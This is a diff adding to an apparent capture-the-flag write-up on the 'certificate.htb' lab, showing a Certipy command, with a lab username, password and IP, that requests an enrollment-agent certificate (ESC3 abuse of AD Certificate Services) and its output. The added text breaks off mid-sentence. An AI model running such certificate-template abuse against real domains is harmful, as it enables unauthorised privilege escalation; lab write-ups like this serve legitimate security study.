@@ -602,7 +602,20 @@ Certificate Templates
 
 https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc3-enrollment-agent-certificate-template
 
+```python
+❯❯❯ certipy-ad req -u 'lion.sk@certificate.htb' -p '!QAZ2wsx' -dc-host dc01.certificate.htb -dc-ip 10.129.245.51 -target-ip 10.129.245.51 -target dc01.certificate.htb -ca 'Certificate-LTD-CA' -template 'Delegated-CRA'
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
+[*] Requesting certificate via RPC
+[*] Request ID is 27
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'Lion.SK@certificate.htb'
+[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1115'
+[*] Saving certificate and private key to 'lion.sk.pfx'
+[*] Wrote certificate and private key to 'lion.sk.pfx'
+```
+
+Ill follow the wiki, ill request a cert for the 
 
 
 
